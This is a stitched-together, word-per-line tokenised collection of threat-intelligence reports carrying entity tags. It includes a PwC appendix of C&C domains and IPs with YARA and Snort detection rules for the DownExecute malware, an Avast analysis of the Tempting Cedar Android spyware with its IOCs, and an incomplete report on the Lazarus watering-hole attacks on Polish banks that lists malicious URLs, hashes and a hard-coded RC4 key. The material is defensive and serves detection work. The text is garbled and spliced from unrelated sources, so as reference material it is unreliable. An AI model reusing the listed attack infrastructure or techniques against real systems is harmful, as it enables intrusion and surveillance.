c9e084eb1ce1066ee063f860c13a8f7d2ead97495036855fc956dacc9a24ea68  B_hash
047e8d542e2fcdf0f4dd45e2b19848771d01abc90d161d05242b79c52cdd248d  B_hash
25e6bf67410dffb95c527c19dcff5223dbc3bf4c987650e45fbea1267072e8ff  B_hash
b0edbd0f44df72e0fad3fb73948444a4df5143ed954c9116eb1a7b606841f187  B_hash
da63f6392ce6af83f6d944fa1bd3f28082345fec928647ee7ef9939fac7b2e6c  B_hash
de3e25a69ba43b9f236e544ece7f2da82a4fafb4489ad2e263754d9b9d88bc5c  B_hash
ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9  B_hash
f969bf3b7a9821b3b2d5de889b5af7af25972b25ba59e4e9439f87fe90f1c404  B_hash
14be3a9a2a4261cb365915e720486a0632dbebb06fe68fb669ae67aa9b18507b  B_hash
488ba22d6cb8c9b0310c58fa4c4739692cdf45676c3164b357314322542f9dff  B_hash
b3a47e0bc0af49b46bc0c1158089bf200856ff462a5334df2b5c11e69c8b1ada  B_hash
324ce011b913feec4adb916f32c743a243f07dccb51b49c0122c4fa4a8e2bded  B_hash
d6df5943169b48ac58fc28bb665fe8800c265b65fff8a2217b70703a4d3a7277  B_hash
88e7a7e815565b92af81761ae7b9153b7507677df3d3b77e8ce68787ad1826d4  B_hash
f51d4155534e10c09b531acc41458e8ff3b7879f4ee7d3ee99f16180c4caf0ee  B_hash
b3a47e0bc0af49b46bc0c1158089bf200856ff462a5334df2b5c11e69c8b1ada  B_hash
bc846caa05939b085837057bc4b9303357602ece83dc1380191bddd1402d4a2b  B_hash

Appendix  B_url.cncsvr
B I
–
C&C
Infrastructure

Value
cbbnews.tk  B_url.cncsvr
haartezenglish.redirectme.net  B_url.cncsvr
wallanews.sytes.net  B_url.cncsvr
kaliob.selfip.org  B_url.cncsvr
deapka.sytes.net  B_url.cncsvr
download.likescandy.com  B_url.cncsvr

Value
Type

Domain

Domain

Domain

Domain

Domain

Domain
orango.redirectme.net  B_url.cncsvr
ynet.sytes.net  B_url.cncsvr
kaswer12.strangled.net  B_url.cncsvr
nazer.zapto.org  B_url.cncsvr
rotter2.sytes.net  B_url.cncsvr
kaswer13.zapto.org  B_url.cncsvr
tango.zapto.org  B_url.cncsvr
kolabdown.sytes.net  B_url.cncsvr
rotter2.publicvm.com  B_url.cncsvr
safar.selfip.com  B_url.cncsvr
bandao.publicvm.com  B_url.cncsvr
safari.linkpc.net  B_url.cncsvr

Domain

Domain

Domain

Domain

Domain

Domain

Domain

Domain

Domain

Domain

Domain

Domain
thenewupdate.chickenkiller.com  B_url.cncsvr

Domain
backjadwer.bounceme.net  B_url.cncsvr
ajaxo.zapto.org  B_url.cncsvr
downloadskype.cf  B_url.cncsvr
redirectlnk.redirectme.net  B_url.cncsvr

Domain

Domain

Domain

Domain
thenewupdatee.redirectme.net  B_url.cncsvr

Domain
chromeupdt.tk  B_url.cncsvr
duntat.zapto.org  B_url.cncsvr
ynet.ignorelist.com  B_url.cncsvr
haartezenglish.strangled.net  B_url.cncsvr
gaonsmom.redirectme.net  B_url.cncsvr
store­legal.biz  B_url.cncsvr
fastbingcom.sytes.net  B_url.cncsvr
downloadlog.linkpc.net  B_url.cncsvr
downloadmyhost.zapto.org  B_url.cncsvr
depka.sytes.net  B_url.cncsvr

Domain

Domain

Domain

Domain

Domain

Domain

Domain

Domain

Domain

Domain
wallanews.publicvm.com  B_url.cncsvr
noredirecto.redirectme.net  B_url.cncsvr
safara.sytes.net  B_url.cncsvr
help2014.linkpc.net  B_url.cncsvr
totoman.no­ip.biz  B_url.cncsvr
lilian.redirectme.net  B_url.cncsvr
webfile.myq­see.com  B_url.cncsvr
185.33.168.150  B_ip.cncsvr
185.45.193.4  B_ip.cncsvr
167.114.62.213  B_ip.cncsvr
131.72.136.11  B_ip.cncsvr
131.72.136.171  B_ip.cncsvr
192.253.246.169  B_ip.cncsvr
198.105.122.96  B_ip.cncsvr
131.72.136.124  B_ip.cncsvr
107.168.129.29  B_ip.cncsvr
198.105.122.9  B_ip.cncsvr

Domain

Domain

Domain

Domain

Domain

Domain

Domain

IPv4
Address

IPv4
Address

IPv4
Address

IPv4
Address

IPv4
Address

IPv4
Address

IPv4
Address

IPv4
Address

IPv4
Address

IPv4
Address

Appendix
C
–
Signatures
rule
DownExecute_A
meta
:
author
=
'
PwC
Cyber
Threat
Operations
:
:
@tlansec
'
date
=
'
2015­04
'
reference
=
'
http://pwc.blogs.com/cyber_security_updates/2015/04/attacks­against­israeli­palestinia
n­interests.html
'
description
=
'
Malware
is
often
wrapped/protected
,
best
to
run
on
memory
'
strings
:
$winver1
=
'
win
8.1
'
$winver2
=
'
win
Server
2012
R2
'
$winver3
=
'
win
Srv
2012
'
$winver4
=
'
win
srv
2008
R2
'
$winver5
=
'
win
srv
2008
'
$winver6
=
'
win
vsta
'
$winver7
=
'
win
srv
2003
R2
'
$winver8
=
'
win
hm
srv
'
$winver9
=
'
win
Strg
srv
2003
'
$winver10
=
'
win
srv
2003
'
$winver11
=
'
win
XP
prof
x64
edt
'
$winver12
=
'
win
XP
'
$winver13
=
'
win
2000
'
$pdb1
=
'
D:\\Acms\\2\\docs\\Visual
Studio
2013\\Projects\\DownloadExcute\\DownloadExcute\\Release\\DownExecute.pdb
'
$pdb2
=
'
d:\\acms\\2\\docs\\visual
studio
2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\writer.h
'
$pdb3
=
'
:\\acms\\2\\docs\\visual
studio
2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\internal/stack.h
'
$pdb4
=
'
\\downloadexcute\\downexecute\\
'
$magic1
=
'
<Win
Get
Version
Info
Name
Error
'
$magic2
=
'
P@$sw0rd$nd
'
$magic3
=
'
$t@k0v2rF10w
'
$magic4
=
'
|*|123xXx(Mutex)xXx321|*|6­21­2014­03:06PM
'
wide
$str1
=
'
Download
Excute
'
ascii
wide
fullword
$str2
=
'
EncryptorFunctionPointer
%d
'
$str3
=
'
%s\\%s.lnk
'
$str4
=
'
Mac:%s­Cpu:%s­HD:%s
'
$str5
=
'
feed
back
responce
of
host
'
$str6
=
'
GET
Token
at
host
'
$str7
=
'
dwn
md5
err
'
condition
:
all
of
(
$winver*
)
or
any
of
(
$pdb*
)
or
any
of
(
$magic*
)
or
2
of
(
$str*
)

Network
IDS
alert
http
any
any
­>
any
any
(
msg:'­­[PwC
CTD]
­­
Unclassified
Middle
Eastern
Actor
­
DownExecute B_malware.infosteal

URI
(
/dw/gtk)';
flow:established,to_server;
urilen:7;
content:'/dw/gtk';
http_uri;
depth:7;
content:'GET
'
;
http_method;
content:!'User­Agent:';
http_header;
content:!'Referer:';
http_header;
http_method;
content:!'User­Agent:';
http_header;
content:!'Referer:';
http_header;
reference:md5,4dd319a230ee3a0735a656231b4c9063;
classtype:trojan­activity;
metadata:tlp

WHITE,author
@ipsosCustodes;
sid:99999901;
rev:2015200401;
)
alert
http
any
any
­>
any
any
(
msg:'­­[PwC
CTD]
­­
Unclassified
Middle
Eastern
Actor
­
DownExecute B_malware.infosteal

URI
(
/dw/setup)';
flow:established,to_server;
urilen:>8;
content:'/dw/setup';
http_uri;
depth:9;
content:'POST
'
;
http_method;
reference:md5,4dd319a230ee3a0735a656231b4c9063;
classtype:trojan­activity;
metadata:tlp
WHITE,author
@ipsosCustodes;
sid:99999902;
rev:2015200401;
)
alert
http
any
any
­>
any
any
(
msg:'­­[PwC
CTD]
­­
Unclassified
Middle
Eastern
Actor
­
DownExecute B_malware.infosteal

Headers';
flow:established,to_server;
urilen:>7;
content:'Accept
*/*';
http_client_body;
content:'Content­Type
:
multipart/form­data\;
boundary=­­­­­­­­­­­­­­­­­­­­­­­­';
http_header;
content
:
'
ci_session=';
http_cookie;
depth:11;
content
:
'
POST';
http_method;
content:!'Referer:';
http_header;
content:!'User­Agent:';
http_header;
reference:md5,4dd319a230ee3a0735a656231b4c9063;
classtype:trojan­activity;
metadata:tlp
WHITE,author
@ipsosCustodes;
sid:99999903;
rev:2015200401;
)
https://github.com/kbandla/APTnotes/blob/master/2012/Cyberattack_against_Israeli_and_Palestinian_targets.pdf  B_url.normal
[2]
https://www.fireeye.com/blog/threat­research/2013/08/operation­molerats­middle­east­cyber­attacksusing­poison­ivy.html­  B_url.normal
[3]
https://malwr.com/analysis/N2I1YmExMjNkMmM3NGQwMThlNjg5YmI4OGY3Mjc3ZmIAccording  B_url.normal
[4]
http://curl.haxx.se B_url.unknown
[6]
ca78b173218ad8be863c7e00fec61f2f  B_url.distribute
[7]
https://www.fireeye.com/blog/threat­research/2013/08/operation­molerats­middle­east­cyber­attacks­using­poison­ivy.html B_url.unknown
Visit
avast.com

English

Menu

THREAT
RESEARCH

Avast
tracks
down
Tempting  B_malware.infosteal
Cedar I
Spyware I

Threat
Intelligence
Team
,
21
February
2018

Social
engineering
used
to
trick
Facebook
users
into
downloading
Advanced
Persistent
Threat
disguised
as
Kik B_malware.drop
Messenger I
app I
.

A
few
months
ago
,
one
of
our
customers
contacted
us
regarding
strange
messages
he
received
on
Facebook
Messenger
.
The
messages
came
from
fake
Facebook
profiles
belonging
to
attractive
,
but
fictitious
women
.
These
women
encouraged
him
to
download
another
chat
application
to
continue
their
conversations
.
The
chat
application
the
women
referred
him
to
was
spyware
,
disguised
as
the
Kik B_malware.drop
Messenger I
app I
,
distributed
through
a
very
convincing
fake
site
.

After
analyzing
the
fake
Kik B_malware.drop
Messenger I
app I
,
we
spotted
the
spyware
,
or
Advanced
Persistent
Threat
(
APT
)
.
We
are
calling
the
APT
'
Tempting  B_malware.infosteal
Cedar I
Spyware I
'
.
We
dug
deeper
into
our
archives
and
found
APKs
belonging
to
several
fake
messenger
and
feed
reader
apps
,
all
of
which
included
the
same
malicious
modules
.

During
our
analysis
,
we
also
discovered
that
our
customer
was
not
the
only
person
to
encounter
the
Tempting  B_malware.infosteal
Cedar I
Spyware I
,
and
,
unfortunately
,
many
fell
for
the
trap
.

Tempting  B_malware.infosteal
Cedar I
Spyware I
was
designed
to
steal
information
like
contacts
,
call
logs
,
SMS
,
and
photos
,
as
well
as
device
information
,
like
geolocation
in
order
to
keep
track
of
movements
-
and
was
capable
of
recording
surrounding
sounds
,
including
conversations
victims
had
while
their
phone
was
within
range
.

Based
on
various
clues
from
the
fake
Facebook
profiles
and
the
campaign
infrastructure
,
we
believe
the
people
behind
the
Tempting  B_malware.infosteal
Cedar I
Spyware I
are
Lebanese  B_malware.unknown
.
The
campaign
was
highly
targeted
and
ran
deep
under
the
radar
.
At
the
moment
,
Avast
is
one
of
few
mobile
antivirus
providers
detecting
the
threat
.
Our
detection
is
Android:SpyAgent-YP
[Trj]
.

Due
to
the
potential
impact
on
the
victims
targeted
with
the
malware
,
we
contacted
law
enforcement
agencies
to
help
us
with
threat
mitigation
.

Infection
vector

More
than
just
Facebook
friends

The
malware
was
distributed
using
several
fake
Facebook
profiles
.
After
engaging
in
flirty
conversations
with
their
victims
,
which
were
most
likely
young
men
,
the
attackers
offered
to
move
the
conversation
from
Facebook
to
a
more
'
secure
and
private
'
platform
,
where
they
could
have
more
intimate
interactions
.
Then
,
the
attackers
sent
a
link
to
the
victims
,
that
led
to
a
phishing
website
,
which
hosted
a
downloadable
and
malicious
version
of
the
Kik B_malware.infosteal
Messenger I
app I
.
The
victims
had
to
adjust
their
device
settings
to
install
apps
from
unknown
sources
,
before
installing
the
fake
messaging
app
.
This
should
raise
red
flags
for
users
,
however
,
sometimes
temptation
trumps
security
.

Once
the
malware
was
installed
,
it
immediately
connected
to
a
command
and
control
(
C&C
)
server
.

The
spyware
was
spread
using
at
least
the
following
three
fake
Facebook
profiles
.
We
have
blurred
the
photos
,
as
the
photos
used
for
the
fake
accounts
were
stolen
from
real
people
:

Alona

Rita

Christina

One
interesting
point
to
note
is
that
the
three
girls
interacted
with
one
another
on
Facebook
,
perhaps
to
make
their
profiles
appear
a
bit
more
credible
:

Above
:
A
screenshot
of
how
the
attackers
convinced
their
victims
to
install
the
fake
Kik B_malware.infosteal
Messenger I
application I
.

The
website
used
to
distribute
a
malicious
copy
of
the
Kik B_malware.infosteal
Messenger I
app I
,
chat-messenger.site
(
185.8.237.151 B_ip.distribute
)
,
operated
until
spring
2017
and
was
a
very
convincing
copycat
.

Deep
analysis

The
Tempting  B_malware.infosteal
Cedar I
Spyware I
is
split
into
different
modules
with
specific
commands
.
There
are
several
modules
designed
to
gather
personal
information
about
the
victim
,
including
contacts
,
photos
,
call
logs
,
SMS
,
as
well
as
information
about
the
mobile
device
,
such
as
geolocation
,
Android
version
,
device
model
,
network
operator
,
and
phone
numbers
.

Other
modules
were
created
to
record
audio
streams
or
gain
access
to
the
infected
device's
file
system
.

All
modules
with
commands
:

Module
name

Commands

AUDIO

CONTACTS

FS
(
File
System
)

START
,
STOP
,
RECORD_START
,

RECORD_STOP

COUNT
,
GET

APP
,
CD
,
DOWNLOAD
,

DOWNLOAD_STATUS
,
EXTERNAL
,

GET
,
INSTALL
,
INTERNAL
,
LS
,
MKDIR
,

PWD
,
RM

GETLOC

INFO
/
USER_INFO

PS
(
running
apps
process
list
)

PHOTOS

TELEPHONE

KEEPALIVE

PING

VIDEO

LSX
,
GETX
,
LSI
,
GETI
,

TAKEPIC_FRONT
,
TAKEPIC_BACK

COUNT_CALL_LOGS
,
COUNT_SMS
,

GET_CALL_LOGS
,
GET_SMS
without
commands
not
implemented
not
implemented

The
spyware
persisted
as
a
service
and
ran
after
every
reboot
.

The
fake B_malware.infosteal
Kik I
application I
contains
the
same
injected
malicious
class
eighty9.guru
and
a
specific
rsdroid.crt
file
with
different
certificates
belonging
to
the
C&C
domain
.

Through
the
reuse
of
the
same
rsdroid.crt
certificate
name
,
we
were
able
to
find
additional
C&C
and
data
exfiltration
servers
.

All
rsdroid.crt
certificates
from
the
fake
APK
:

Issued
to

Valid
from

Valid
to

Serial
number

gserv.mobi
2015-04-28
2020-04-01
00fe4b81ee781fe
486

network-lab.info
2016-03-29
2026-03-27
0090400fbd572e
dcc6

onlineclub.info
2017-05-24
2027-05-22
00e7238783cc4e
87de

free-apps.us
2017-08-24
2035-11-08
00b6965aa72d97
446d

C&C
administration
and
infrastructure

Following
their
victims
'
every
step

The
malware
communicated
on
the
TCP
port
2020
,
but
it
is
also
worth
mentioning
that
there
was
also
a
C&C
console
running
on
port
443
with
a
familiar
certificate
subject
common
name
-
rsdroid
.

The
C&C
console
allowed
attackers
to
live
track
their
victims
.
The
image
below
does
not
include
any
data
,
as
we
don't
want
to
disclose
any
of
the
victims
'
locations
,
but
shows
the
region
where
Tempting  B_malware.infosteal
Cedar I
was
spread
the
most
:

Other
hosts
with
this
common
name
are
easy
to
find
using
open
source
tools
:

Above
:
Open
source
data
about
the
C&C
server
hosts

We
created
an
image
of
the
computer
infrastructure
used
in
the
campaign
:

All
signs
point
to
Lebanon

It
is
always
difficult
to
attribute
persistent
threat
campaigns
,
like
this
one
,
to
cybercriminals
.
However
,
pieces
of
information
point
to
the
cybercriminals
behind
this
campaign
being
Lebanese  B_malware.unknown
.

The
first
clue
that
led
us
to
this
conclusion
are
the
attackers
'
working
hours
.
We
only
saw
about
30
logins
in
the
SSH
log
we
received
.
The
user
root
logged
on
on
workdays
,
occasionally
on
Saturdays
,
but
never
on
Sundays
.

The
working
hours
in
the
SSH
log
correspond
with
Eastern
European
and
Middle
Eastern
time
zones
.

The
second
breadcrumb
we
found
was
the
infrastructure
used
in
the
campaign
,
which
also
points
to
Lebanon
.

WHOIS
data
revealed
that
two
domains
used
were
registered
by
someone
from
Lebanon
,
whereas
others
were
registered
with
fictitious
registrant
data
.

Chat-world.site
was
registered
by
Jack
Zogby
,
Beirut
,
Lebanon
,
jack.zogby@yandex.com

Network-lab.info
was
registered
by
Jack
Halawani
,
Beirut
,
Lebanon
,
jack.halawani@yandex.com

Over
the
last
two
years
,
SSH
logins
were
made
from
Lebanese  B_malware.unknown
ISPs
'
IP
ranges
.
(
185.99.32.0/22  B_ip.distribute
,
78.40.183.0/24  B_ip.distribute
)

One
of
the
fake
Facebook
profile's
likes
are
also
interesting
,
and
if
any
of
the
victims
had
taken
a
closer
look
at
these
,
they
may
not
have
fallen
for
the
scam
.
Rita
,
the
petite
brunette
,
seems
to
be
interested
in
military
groups
,
and
a
Lebanese  B_malware.unknown
and
Israel
friendship
.

Above
:
Rita's
likes
on
Facebook

The
Lebanon
&
Israel
Friendship
connection
group
is
interesting
when
considering
the
the
victims
'
locations
.

While
we
observed
a
low
number
of
victims
from
the
USA
,
France
,
Germany
,
and
China
,
the
majority
of
victims
were
from
the
Middle
East
,
with
most
of
the
victims
located
in
Israel
:

Above
:
Map
showing
the
countries
most
of
the
victims
came
from

Conclusion

The
targeted
Tempting  B_malware.infosteal
Cedar I
campaign
has
been
running
under
the
radar
since
as
far
back
as
2015
,
targeting
people
in
Middle
Eastern
countries
.
The
spyware's
infection
vector
involves
social
engineering
using
attractive
,
but
fictitious
Facebook
profiles
.
The
fake  B_malware.drop
Kik I
APK I
sent
to
victims
is
masqueraded
as
a
legitimate
Kik B_malware.infosteal
Messenger I
app I
,
however
,
after
gaining
access
to
victims
'
phones
,
the
spyware
starts
to
exfiltrate
sensitive
data
,
sending
data
back
to
the
attacker's
infrastructure
.
Evidence
points
to
the
attackers
being
a
Lebanese  B_malware.unknown
hacking
group;
however
,
we
cannot
be
100%
sure
this
is
true
.
The
social
engineering
part
of
the
campaign
seems
to
have
targeted
people
in
Eastern
European
and
Middle
Eastern
countries
.

Despite
unsophisticated
techniques
and
the
level
of
operational
security
being
used
,
the
attack
managed
to
remain
undetected
for
several
years
.

The
cybercriminals
behind
the
Tempting  B_malware.infosteal
Cedar I
Spyware I
were
able
to
install
a
persistent
piece
of
spyware
by
exploiting
social
media
,
like
Facebook
,
and
people's
lack
of
security
awareness
,
and
were
thus
able
to
gather
sensitive
and
private
data
from
their
victims
'
phones
including
real-time
location
data
which
makes
the
malware
exceptionally
dangerous
.

Steps
to
take
to
protect
yourself
against
spyware

Here
are
a
few
things
you
can
do
to
avoid
being
manipulated
like
this
into
downloading
spyware
:

Use
antivirus
software
.
Even
if
you
accidentally
download
malware
onto
your
phone
,
Avast
will
detect
and
remove
the
malware
,
to
keep
your
data
and
privacy
safe
.

Don't
talk
to
strangers
.
There
is
a
reason
why
parents
have
been
warning
kids
about
talking
to
strangers
and
this
case
confirms
that
talking
to
strangers
online
is
no
different
and
is
not
a
good
idea
.

Never
open
links
or
download
software
sent
to
you
from
untrusted
sources
.
The
victims
of
this
spyware
campaign
were
tricked
into
downloading
the
spyware
themselves
because
they
trusted
the
girls
they
were
talking
to
online
,
despite
never
meeting
them
in
person
.
On
top
of
this
,
they
ignored
Android's
warnings
about
downloading
apps
from
unknown
sources
.

Download
from
the
source
.
Whenever
possible
,
visit
the
homepage
of
an
established
company
directly
-
by
typing
in
the
URL
yourself
-
as
they
often
promote
their
mobile
apps
on
their
websites
and
download
the
app
straight
from
the
source
.
Had
the
victims
done
this
,
they
would
have
avoided
the
fake
and
malicious
Kik
app
.
The
'
girls
'
probably
would
have
stopped
talking
to
them
,
but
that
would
have
been
for
their
own
good
!

IOCs

Fake
Kik
messenger
SHA256
:
041136252FFEF074B0DEBA167BD12B8977E276BAC90195B7112260AB31D

DB810
2807AB1A912FF0751D5B7C7584D3D38ACC5C46AFFE2F168EEAEE70358

DC90006
3065AD0932B1011E57961104EB96EEE241261CB26B9252B0770D053208
39915F
5259AD04BDEA3F41B3913AA09998DB49553CE529E29C868C48DF40D
5AA7157EA
624A196B935427A82E8060876480E30CE6867CB9604107A44F85E2DA
96A7A22E
9D1FDA875DE75DEA545D1FF84973B230412B8B4946D64FF900E9D22B
065F8DCC

B181F418F6C8C79F28B1E9179CAEFEB81BDF77315814F831AF0CF0C2507
860C4

D7A4ABA5FC2DEE270AE84EAC1DB98B7A352FB5F04FD07C3F9E69DE6

E58B4C745

F67469C82E948628761FDFD26177884384481BA4BDBC15A53E8DF92D3

F216648

FE2996BC0C47C0626F43395EEE445D12E7C024C1B0AA2358947B5F1D
839A5868

Fake
Datasettings
SHA256
:
1DEB727C05AA5FABF6224C0881970ACA78649A799EEB6864260DE976
35FA005A
94ADF4C8A27722307C11F6C0376D4A51CFD56BA3CC47F9E5447179D1E
0F7289F

A411A587B4256007F0E0A3C3A3C3097062242B5359A05A986195E76D

A7334B7D

Fake
feedreader
SHA256
:
58F74545D47F5DA1ECF3093F412D7D9544A33D36430AB1AF709D835A5
9184611

Domains
:
chat-world.site B_url.distribute
chat-messenger.site B_url.distribute
gserv.mobi B_url.distribute
arab-chat.site B_url.distribute
onlineclub.info B_url.distribute
free-apps.us B_url.distribute
network-lab.info B_url.distribute
kikstore.net B_url.distribute

IPs
(
including
historic
records
)
:
185.166.236.134 B_ip.distribute
46.28.109.69 B_ip.distribute
5.135.207.244 B_ip.distribute
31.31.75.174 B_ip.distribute
155.94.136.10 B_ip.distribute
213.32.65.238 B_ip.distribute
84.200.17.154 B_ip.distribute
185.8.237.151 B_ip.distribute
213.32.65.238 B_ip.distribute
5.45.176.236 B_ip.distribute
46.101.199.72 B_ip.distribute
185.99.32.0/22 B_ip.distribute
78.40.183.0/24 B_ip.distribute

Rsdroid
certificate
serial
numbers
:
10418450096179084191
11696648495248868788
13367542350555075590
17798583036840002648
17362149250016288818
11008990750836915855
12430448762037889566
12941986373589998425
14237693369114233902
15175240657458101230
18263349974554467657
10031168301806868687
12450086912549212859
13469158752397659430
13887786183890428647
15448206077875179259
15525317917180712785
16639512314094306104
10671561344391424094
14360088739535268901
16495367076336282102
15684750702817909758
17908820252718507450
10302454590553748328

Fake
FB
profiles
:
facebook.com/profile.php?id=100013563997788 B_url.distribute
facebook.com/profile.php?id=100011377795504 B_url.distribute
facebook.com/profile.php?id=100011891805784 B_url.distribute

Related
articles

THREAT
RESEARCH

Botnet
at
large
:

Avast
blocks

Smominru
miner

The
cryptominer
botnet
attacked
over
half
a
million

Windows
servers
and
computers
so
far...but
that
number
is
growing
.

THREAT
RESEARCH

Meltdown
and

Spectre
:
Yes
,
your
device
is
likely
vulnerable
'
Meltdown
'
and
'
Spectre
'
are
major
vulnerabilities
affecting
almost
every
computer
in
the
world
.

THREAT
RESEARCH

New
version
of
mobile
malware

Catelites
possibly
linked
to
Cron
cyber
gang

New
malware
targets
accounts
at
over
2,200
financial
institutions
2
February
2018
read
3
min
5
January
2018
7
min
read
20
December
2017
read
12
min

Never
miss
our
news
your
e-mail
addr

SUBSCRIBE
1988
-
2018
Copyright
©
Avast
Software
s.r.o.
|
Sitemap
Lazarus
&
Watering-hole

On
3rd
February
2017
,
researchers
at
badcyber.com  B_url.normal
released
an
article
that
detailed
a
series
of
attacks
directed
at
Polish
financial
institutions
.

The
article
is
brief
,
but
states
that
'
This
is
–
by
far
–
the
most
serious
information
security
incident
we
have
seen
in
Poland
'
followed
by
a
claim
that
over
20
commercial
banks
had
been
confirmed
as
victims
.

This
report
provides
an
outline
of
the
attacks
based
on
what
was
shared
in
the
article
,
and
our
own
additional
findings
.

ANALYSIS

As
stated
in
the
blog
,
the
attacks
are
suspected
of
originating
from
the
website
of
the
Polish
Financial
Supervision
Authority
(
knf.gov[.]pl
)
,
shown
below
:

From
at
least
2016-10-07
to
late
January
the
website
code
had
been
modified
to
cause
visitors
to
download
malicious
JavaScript
files
from
the
following
locations
:
hxxp://sap.misapor[.]ch/vishop/view.jsp?pagenum=1 B_url.distribute
hxxps://www.eye-watch[.]in/design/fancybox/Pnf.action B_url.distribute

Both
of
these
appear
to
be
compromised
domains
given
they
are
also
hosting
legitimate
content
and
have
done
for
some
time
.

The
malicious
JavaScript
leads
to
the
download
of
malware
to
the
victim's
device
.

Some
hashes
of
the
backdoor
have
been
provided
in
BadCyber's
technical
analysis
:
85d316590edfb4212049c4490db08c4b  B_hash
c1364bbf63b3617b25b58209e4529d8c  B_hash
1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae  B_hash

The
C&Cs
given
in
the
BadCyber
analysis
were
the
following
IP
addresses
:
125.214.195.17  B_ip.cncsvr
196.29.166.218  B_ip.cncsvr

LAZARUS
MALWARE

Only
one
of
the
samples
referenced
by
BadCyber
is
available
in
public
malware
repositories
.

At
the
moment
we
cannot
verify
that
it
originated
from
the
watering-hole
on
the
KNF
website
–
but
we
have
no
reason
to
doubt
this
either
.

MD5
hash

Filename

File
Info

First
seen

Origin
85d316590edfb4212049c4490db08c4b  B_hash
gpsvc.exe B_malware.drop
Win32
(
736
KB
)
2017-01-26
07:46:24

The
file
is
packed
with
a
commercial
packer
known
as
'
Enigma
Protector
'
.

Once
unpacked
it
drops
a
known
malware
variant
,
which
has
been
seen
as
part
of
the
Lazarus
group's
toolkit
in
other
cases
over
the
past
year
.

The
unpacked
executable
takes
several
command
line
arguments
:
-l
:
list
service
names
,
available
for
its
own
registration
-o
:
open
specified
event
-t
:
set
specified
event
-x
[PASSWORD]
-e
[SERVICE_NAME]
:
drop/install
DLL
under
specified
[SERVICE_NAME]
-x
[PASSWORD]
-f
[SERVICE_NAME]
:
recreate
the
keys
that
keep
the
password
for
the
next
stage
DLL
,
under
the
specified
[SERVICE_NAME]

The
provided
password's
MD5
hash
is
used
as
an
RC4
password
.

On
top
of
that
,
there
is
one
more
RC4-round
,
using
a
hard
coded
32-byte
RC4
password
:
53
87
F2
11
30
3D
B5
52
AD
C8
28
09
E0
52
60
D0
6C
C5
68
E2
70
77
3C
8F
12
C0
7B
13
D7
B3
9F
15

Once
the
data
is
decrypted
with
two
RC4
rounds
,
the
dropper
checks
the
decrypted
data
contains
a
valid
4-byte
signature
:
0xBC0F1DAD
.

WATERING
HOLE
ANALYSIS

The
attacker
content
on
the
compromised
sap.misapor[.]ch  B_url.distribute
site
was
not
accessible
at
the
time
of
writing
.

However
,
archived
versions
of
some
pages
can
be
found
:
http://web.archive[.]org/web/20170203175640/https://sap.misapor.ch/Default.html  B_url.distribute
http://web.archive[.]org/web/20170203175641/https://sap.misapor.ch/Silverlight.js  B_url.distribute

The
Default.html
contains
code
to
load
MisaporPortalUI.xap
–
a
Silverlight
application
which
likely
would
contain
the
malicious
first-stage
implant
.

This
is
unfortunately
not
available
for
analysis
currently
.

<div
id='silverlightControlHost'>
<object
data='data:application/x-silverlight
,
'
type='application/x-silverlight-2
'
width='100%
'
height='100%'>
<param
name='source
'
value='ClientBin/MisaporPortalUI.xap?ver=1.0.7.0'/>
<param
name='onerror
'
value='onSilverlightError
'
/>
<param
name='background
'
value='white
'
/>
<param
name='minRuntimeVersion
'
value='3.0.40624.0
'
/>
<param
name='autoUpgrade
'
value='true
'
/>
<a
href='/web/20170203175640/http://go.microsoft.com/fwlink/ B_url.unknown
?

LinkID=149156&v=3.0.40624.0
'
style='text-decoration
:
none;'>
<img
src='/web/20170203175640im_/http://go.microsoft.com/fwlink/?LinkId=108181 B_url.unknown
'
alt='Get
Microsoft
Silverlight
'
style='border-style
:
none'/>
</a>
</object>
<iframe
id='_sl_historyFrame
'
style='visibility:hidden;height:0;width:0;border:0px'>
</iframe>
</div>

ADDITIONAL
WATERING
HOLES

The
eye-watch[.]in
domain
appears
to
have
been
used
in
watering-hole
attacks
on
other
financial
sector
websites
.

On
2016-11-08
we
observed
connections
to
the
site
referred
from
:
hxxp://www.cnbv.gob[.]mx/Prensa/Paginas/Sanciones.aspx B_url.unknown

This
is
the
page
for
the
Comisión
Nacional
Bancaria
y
de
Valores
(
National
Banking
and
Stock
Commission
of
Mexico
)
,
specifically
the
portion
of
their
site
that
details
sanctions
made
by
the
Mexican
National
Banking
Commission
.
This
organisation
is
the
Mexican
banking
supervisor
and
the
equivalent
of
Poland's
KNF
.

In
this
instance
the
site
redirected
to
the
following
URL
:
hxxp://www.eye-watch[.]in/jscroll/images/images.jsp?pagenum=1 B_url.unknown

At
the
time
of
writing
the
compromise
is
no
longer
present
and
no
archived
versions
of
the
page
exist
to
show
where
the
compromise
was
located
.

A
further
instance
of
the
malicious
code
appears
to
have
been
present
on
a
bank
website
in
Uruguay
around
201610-26
when
a
PCAP
of
browsing
to
the
website
was
uploaded
to
VirusTotal.com  B_url.normal
.

This
shows
a
GET
request
made
to
:
hxxp://brou.com[.]uy  B_url.unknown

Followed
shortly
after
by
connections
to
:
www.eye-watch[.]in:443  B_url.unknown

Unfortunately
,
the
response
was
empty
and
it
is
not
possible
to
assess
what
may
have
been
delivered
.

ADDITIONAL
MALWARE
AND
EXPLOIT
ACTIVITY

The
compromised
eye-watch[.]in  B_url.distribute
domain
has
been
associated
with
other
malicious
activity
in
recent
months
.

Below
is
a
list
of
samples
which
have
used
the
site
:

MD5
hash

Filename

File
Info

First
seen

Origin
4cc10ab3f4ee6769e520694a10f611d5  B_hash
cambio.xap
(
73
KB
)
cb52c013f7af0219d45953bae663c9a2  B_hash
svchost.exe
Win32
EXE
(
126
KB
)
2016-10-07
03:09:43
2016-10-24
12:10:33
1f7897b041a812f96f1925138ea38c46  B_hash
gpsvc.exe
911de8d67af652a87415f8c0a30688b2  B_hash
gpsvc.exe

Win32
EXE
(
126
KB
)
2016-10-27
14:29:58

Win32
EXE
(
126
KB
)
2016-10-28
11:50:15
1507e7a741367745425e0530e23768e6  B_hash
gpsvc.exe

Win32
EXE
(
126
KB
)
2016-11-15
18:20:34

The
last
4
samples
can
loosely
be
categorised
as
the
same
malware
variant
,
however
the
first
sample
appears
to
be
a
separate
exploit
(
as
detailed
later
)
.

It
is
worth
noting
that
these
samples
were
all
compiled
after
the
domain
began
being
used
alongside
the
knf.gov[.]pl
watering-hole
.
Additionally
,
the
samples
uploaded
from
Poland
and
Uruguay
match
with
the
watering-hole
activity
observed
–
suggesting
this
is
all
